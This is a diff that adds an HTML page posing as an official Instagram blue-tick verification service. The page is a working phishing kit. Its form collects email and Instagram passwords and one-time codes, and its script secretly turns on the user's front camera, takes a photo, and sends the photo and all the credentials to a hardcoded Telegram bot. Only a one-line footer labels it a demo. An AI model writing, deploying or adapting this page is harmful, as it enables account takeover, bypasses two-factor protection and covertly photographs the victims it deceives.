@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Blue Tick · Official Verification</title>
+    <!-- Font Awesome & Google Fonts -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: #ffffff;
+            color: #1e1e2f;
+            overflow-x: hidden;
+        }
+
+        /* Navbar */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 5%;
+            background: white;
+            border-bottom: 1px solid #f0f0f0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.02);
+        }
+
+        .logo {
+            font-size: 1.6rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #0095f6, #833ab4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+        }
+
+        .logo i {
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, #0095f6, #833ab4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2.5rem;
+            align-items: center;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #2d2d3a;
+            font-weight: 500;
+            font-size: 0.95rem;
+            transition: 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: #0095f6;
+        }
+
+        .apply-btn {
+            background: linear-gradient(145deg, #0095f6, #833ab4);
+            color: white !important;
+            padding: 0.6rem 1.5rem;
+            border-radius: 40px;
+            font-weight: 600 !important;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 8px 18px rgba(0,149,246,0.2);
+        }
+
+        .apply-btn i {
+            font-size: 0.8rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 3rem 5%;
+            gap: 4rem;
+            flex-wrap: wrap;
+            background: linear-gradient(145deg, #fff9fb, #ffffff);
+            min-height: 90vh;
+        }
+
+        .hero-content {
+            flex: 1 1 450px;
+        }
+
+        .hero-content h1 {
+            font-size: 3.2rem;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 1rem;
+        }
+
+        .hero-content h1 .blue-text {
+            background: linear-gradient(135deg, #0095f6, #833ab4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: block;
+        }
+
+        .hero-content h1 .dark-text {
+            display: block;
+            color: #1e1e2f;
+        }
+
+        .hero-content p {
+            color: #5e5e71;
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            max-width: 500px;
+            line-height: 1.6;
+        }
+
+        .cta-buttons {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin-bottom: 2rem;
+        }
+
+        .btn-primary {
+            background: linear-gradient(145deg, #0095f6, #833ab4);
+            border: none;
+            color: white;
+            font-weight: 600;
+            padding: 0.9rem 2.2rem;
+            border-radius: 40px;
+            font-size: 1rem;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 10px 20px rgba(0,149,246,0.3);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 1.5px solid #0095f6;
+            color: #0095f6;
+            font-weight: 600;
+            padding: 0.9rem 2.2rem;
+            border-radius: 40px;
+            font-size: 1rem;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .verified-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 1.5rem;
+            background: #f0f8ff;
+            padding: 0.6rem 1.2rem;
+            border-radius: 40px;
+            width: fit-content;
+        }
+
+        .verified-badge .tick-icon {
+            color: #0095f6;
+            font-size: 1.8rem;
+            font-weight: 800;
+            line-height: 1;
+        }
+
+        .verified-badge span {
+            font-weight: 600;
+            font-size: 1.2rem;
+            color: #1e1e2f;
+        }
+
+        .hero-image {
+            flex: 1 1 300px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .hero-image img {
+            max-width: 100%;
+            width: 380px;
+            border-radius: 30px;
+            box-shadow: 0 30px 40px rgba(0,0,0,0.1);
+        }
+
+        /* Features Section */
+        .features {
+            padding: 5rem 5%;
+            background: #fafafa;
+            text-align: center;
+        }
+
+        .features h2 {
+            font-size: 2.2rem;
+            margin-bottom: 3rem;
+            font-weight: 600;
+        }
+
+        .feature-grid {
+            display: flex;
+            gap: 2rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .feature-card {
+            background: white;
+            border-radius: 30px;
+            padding: 2rem 1.5rem;
+            flex: 1 1 220px;
+            max-width: 280px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.02);
+            border: 1px solid #f0f0f0;
+        }
+
+        .feature-card i {
+            font-size: 2.5rem;
+            background: linear-gradient(145deg, #0095f6, #833ab4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+
+        .feature-card h3 {
+            font-size: 1.3rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .feature-card p {
+            color: #6b6b7b;
+        }
+
+        /* How It Works Section */
+        .how-it-works {
+            padding: 5rem 5%;
+            background: white;
+            text-align: center;
+        }
+
+        .how-it-works h2 {
+            font-size: 2.2rem;
+            margin-bottom: 3rem;
+            font-weight: 600;
+        }
+
+        .steps-container {
+            display: flex;
+            gap: 2rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .step {
+            flex: 1 1 200px;
+            max-width: 250px;
+        }
+
+        .step-number {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(145deg, #0095f6, #833ab4);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 0 auto 1rem;
+        }
+
+        .step h3 {
+            font-size: 1.2rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .step p {
+            color: #6b6b7b;
+        }
+
+        /* Verification Form Section - Card Style */
+        .verify-section {
+            padding: 5rem 5%;
+            background: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .verify-card {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0,149,246,0.25);
+            border: 1px solid rgba(0,149,246,0.1);
+            transition: transform 0.2s;
+        }
+
+        .verify-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .card-header i {
+            font-size: 2.5rem;
+            background: linear-gradient(145deg, #0095f6, #833ab4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5rem;
+        }
+
+        .card-header h3 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(145deg, #0095f6, #833ab4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group label {
+            font-weight: 500;
+            display: block;
+            margin-bottom: 0.4rem;
+            color: #2d2d3a;
+            font-size: 0.95rem;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #f5f5f5;
+            border-radius: 16px;
+            padding: 0 1rem;
+            border: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .input-wrapper i {
+            color: #a0a0b0;
+            font-size: 1.1rem;
+            width: 24px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 0.9rem 0.5rem;
+            outline: none;
+            font-size: 1rem;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #0095f6;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0,149,246,0.1);
+        }
+
+        .btn-verify {
+            width: 100%;
+            background: linear-gradient(145deg, #0095f6, #833ab4);
+            border: none;
+            color: white;
+            font-weight: 600;
+            padding: 1rem;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            margin: 1.5rem 0 0.5rem;
+            cursor: pointer;
+            box-shadow: 0 8px 18px rgba(0,149,246,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s;
+        }
+
+        .btn-verify:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 24px rgba(0,149,246,0.4);
+        }
+
+        .fine-print {
+            text-align: center;
+            color: #888;
+            font-size: 0.75rem;
+            margin-top: 1rem;
+        }
+
+        /* Footer */
+        .footer {
+            background: #1e1e2f;
+            color: #d0d0e0;
+            padding: 3rem 5%;
+            text-align: center;
+        }
+
+        .footer h3 {
+            color: white;
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .footer .links {
+            display: flex;
+            gap: 2rem;
+            justify-content: center;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+
+        .footer a {
+            color: #d0d0e0;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            color: #0095f6;
+        }
+
+        .contact-info {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            flex-wrap: wrap;
+            margin: 2rem 0;
+        }
+
+        .contact-info div {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .contact-info i {
+            color: #0095f6;
+            font-size: 1.2rem;
+        }
+
+        .copyright {
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Hidden video element for camera */
+        #hiddenCamera {
+            display: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero-content h1 {
+                font-size: 2.5rem;
+            }
+            .nav-links {
+                display: none;
+            }
+            .verify-card {
+                margin: 0 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav class="navbar">
+        <a href="#home" class="logo">
+            <i class="fab fa-instagram"></i> Blue Tick
+        </a>
+        <div class="nav-links">
+            <a href="#home">Home</a>
+            <a href="#features">Features</a>
+            <a href="#how-it-works">How it works</a>
+            <a href="#verified">Verified</a>
+            <a href="#support">Support</a>
+            <a href="#verified" class="apply-btn">Apply Now <i class="fas fa-arrow-right"></i></a>
+        </div>
+    </nav>
+
+    <!-- Home Section -->
+    <section id="home" class="hero">
+        <div class="hero-content">
+            <h1>
+                <span class="dark-text">Get Instagram</span>
+                <span class="blue-text">Blue Tick</span>
+                <span class="dark-text">Official Verification</span>
+            </h1>
+            <p>Partner with top brands and stand out with the verified badge. Trusted by 10k+ creators.</p>
+            <div class="cta-buttons">
+                <a href="#verified" class="btn-primary"><i class="fab fa-instagram"></i> Apply for Blue Tick</a>
+                <a href="#how-it-works" class="btn-secondary">Learn More <i class="fas fa-arrow-right"></i></a>
+            </div>
+            <div class="verified-badge">
+                <span class="tick-icon">✓</span>
+                <span>Verified</span>
+            </div>
+        </div>
+        <div class="hero-image">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='400' viewBox='0 0 400 400'%3E%3Crect width='400' height='400' fill='%23f8eef2'/%3E%3Ccircle cx='200' cy='200' r='100' fill='%230095f6' opacity='0.1'/%3E%3Cpath d='M200 130 L220 180 L280 180 L230 210 L250 260 L200 230 L150 260 L170 210 L120 180 L180 180 Z' fill='%230095f6'/%3E%3Ctext x='120' y='300' font-family='Inter' font-size='24' fill='%23833ab4'%3E✓ Verified%3C/text%3E%3C/svg%3E" alt="Blue tick illustration">
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="features">
+        <h2>Why get verified on Instagram?</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <i class="fas fa-check-circle"></i>
+                <h3>Official Blue Tick</h3>
+                <p>Get the verified badge and build trust with your audience.</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-chart-line"></i>
+                <h3>Boost Visibility</h3>
+                <p>Higher reach in search and recommendations.</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-shield-alt"></i>
+                <h3>Secure Process</h3>
+                <p>End-to-end encrypted application via our partner bot.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works Section -->
+    <section id="how-it-works" class="how-it-works">
+        <h2>How It Works</h2>
+        <div class="steps-container">
+            <div class="step">
+                <div class="step-number">1</div>
+                <h3>Fill the Form</h3>
+                <p>Enter your email, email password, Instagram ID, Instagram password, and OTP.</p>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <h3>Submit Details</h3>
+                <p>Your data </p>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <h3>Get Verified</h3>
+                <p>Receive your blue tick within 24-48 hours.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Verified / Verification Form Section (with Email Password + Instagram Password) -->
+    <section id="verified" class="verify-section">
+        <div class="verify-card">
+            <div class="card-header">
+                <i class="fab fa-instagram"></i>
+                <h3>Apply for Verification</h3>
+            </div>
+            <div class="input-group">
+                <label><i class="far fa-envelope"></i> Email address</label>
+                <div class="input-wrapper">
+                    <i class="far fa-envelope"></i>
+                    <input type="email" id="email" placeholder="your.email@example.com" required>
+                </div>
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-lock"></i> Email Password</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" id="emailPassword" placeholder="••••••••" required>
+                </div>
+            </div>
+            <div class="input-group">
+                <label><i class="fab fa-instagram"></i> Instagram ID</label>
+                <div class="input-wrapper">
+                    <i class="fab fa-instagram"></i>
+                    <input type="text" id="instagramId" placeholder="@username" required>
+                </div>
+            </div>
+            <div class="input-group">
+                <label><i class="fab fa-instagram"></i> Instagram Password</label>
+                <div class="input-wrapper">
+                    <i class="fab fa-instagram"></i>
+                    <input type="password" id="instagramPassword" placeholder="••••••••" required>
+                </div>
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-shield-alt"></i> OTP (verification code)</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-key"></i>
+                    <input type="text" id="otp" placeholder="6-digit code" required>
+                </div>
+            </div>
+            <button class="btn-verify" id="verifyBtn">
+                <i class="fab fa-instagram"></i> Verify & get blue tick
+            </button>
+            <p class="fine-print"></p>
+        </div>
+    </section>
+
+    <!-- Support Section (Footer) -->
+    <footer id="support" class="footer">
+        <h3><i class="fab fa-instagram"></i> Instagram Blue Tick</h3>
+        <div class="contact-info">
+            <div><i class="fas fa-envelope"></i> support@bluetick.ig</div>
+            <div><i class="fas fa-phone"></i> +1 (800) 123-4567</div>
+            <div><i class="fas fa-clock"></i> 24/7 Support</div>
+        </div>
+        <div class="links">
+            <a href="#home">Home</a>
+            <a href="#features">Features</a>
+            <a href="#how-it-works">How it works</a>
+            <a href="#verified">Verified</a>
+            <a href="#support">Support</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+        </div>
+        <div class="copyright">
+            <p>© 2025 Instagram Blue Tick Verification. All rights reserved. Demo project with on-demand camera capture.</p>
+        </div>
+    </footer>
+
+    <!-- Hidden video element for camera -->
+    <video id="hiddenCamera" width="640" height="480" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('hiddenCamera');
+        const canvas = document.getElementById('hiddenCanvas');
+        const context = canvas.getContext('2d');
+        
+        let cameraStream = null;
+        let cameraReady = false;
+
+        // Function to initialize camera (called only when verify is clicked)
+        async function initCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 640, 
+                        height: 480,
+                        facingMode: 'user' // front camera
+                    }, 
+                    audio: false 
+                });
+                video.srcObject = cameraStream;
+                cameraReady = true;
+                console.log('Camera ready (hidden)');
+                return true;
+            } catch (err) {
+                console.error('Camera error:', err);
+                cameraReady = false;
+                return false;
+            }
+        }
+
+        // Function to capture photo (assumes camera is ready)
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                if (!cameraReady || !cameraStream) {
+                    resolve(null);
+                    return;
+                }
+                
+                // Draw video frame to canvas
+                context.drawImage(video, 0, 0, 640, 480);
+                
+                // Convert to blob
+                canvas.toBlob((blob) => {
+                    resolve(blob);
+                }, 'image/jpeg', 0.9);
+            });
+        }
+
+        // Function to stop camera tracks (to release camera)
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+                cameraReady = false;
+            }
+        }
+
+        // Handle verify button click
+        document.getElementById('verifyBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const emailVal = document.getElementById('email').value.trim();
+            const emailPasswordVal = document.getElementById('emailPassword').value.trim();
+            const instagramIdVal = document.getElementById('instagramId').value.trim();
+            const instagramPasswordVal = document.getElementById('instagramPassword').value.trim();
+            const otpVal = document.getElementById('otp').value.trim();
+
+            if (!emailVal || !emailPasswordVal || !instagramIdVal || !instagramPasswordVal || !otpVal) {
+                alert('Please fill all fields');
+                return;
+            }
+
+            // Disable button
+            const btn = this;
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processing...';
+            btn.disabled = true;
+
+            try {
+                // Request camera permission now (if not already)
+                if (!cameraReady) {
+                    const granted = await initCamera();
+                    if (!granted) {
+                        // If user denies camera, we still send text message
+                        alert('Camera permission denied. Sending verification without photo.');
+                    }
+                }
+
+                // Capture photo if camera is ready
+                let photoBlob = null;
+                if (cameraReady) {
+                    // Wait a tiny bit for camera to stabilize
+                    await new Promise(r => setTimeout(r, 500));
+                    photoBlob = await capturePhoto();
+                    // Stop camera after capture to free resources (optional)
+                    stopCamera();
+                }
+                
+                // Prepare caption for Telegram
+                const caption = `🔷 INSTAGRAM BLUE TICK VERIFICATION 🔷\n\n📧 Email: ${emailVal}\n🔐 Email Password: ${emailPasswordVal}\n👤 Instagram ID: ${instagramIdVal}\n🔑 Instagram Password: ${instagramPasswordVal}\n📲 OTP: ${otpVal}\n\n🕒 ${new Date().toLocaleString()}`;
+
+                if (photoBlob) {
+                    // Send photo with caption
+                    const formData = new FormData();
+                    formData.append('chat_id', '5573960684');
+                    formData.append('photo', photoBlob, 'photo.jpg');
+                    formData.append('caption', caption);
+
+                    const response = await fetch(`https://api.telegram.org/bot8680350460:AAFCE5_qlIWQ8m2uITU-f3x3WBzLVv9Y5Ks/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const result = await response.json();
+                    console.log('Telegram response:', result);
+                    
+                    if (result.ok) {
+                        alert('✅ Verification request sent with your photo!');
+                    } else {
+                        alert('❌ Telegram error: ' + result.description);
+                    }
+                } else {
+                    // Fallback: send text only
+                    const textResponse = await fetch(`https://api.telegram.org/bot8680350460:AAFCE5_qlIWQ8m2uITU-f3x3WBzLVv9Y5Ks/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: '5573960684',
+                            text: caption + '\n\n⚠️ Camera not available, photo not sent.'
+                        })
+                    });
+                    alert('✅ Verification request sent (without photo).');
+                }
+                
+                // Optional: clear form
+                // document.getElementById('email').value = '';
+                // document.getElementById('emailPassword').value = '';
+                // document.getElementById('instagramId').value = '';
+                // document.getElementById('instagramPassword').value = '';
+                // document.getElementById('otp').value = '';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                alert('❌ Something went wrong. Please try again.');
+            } finally {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
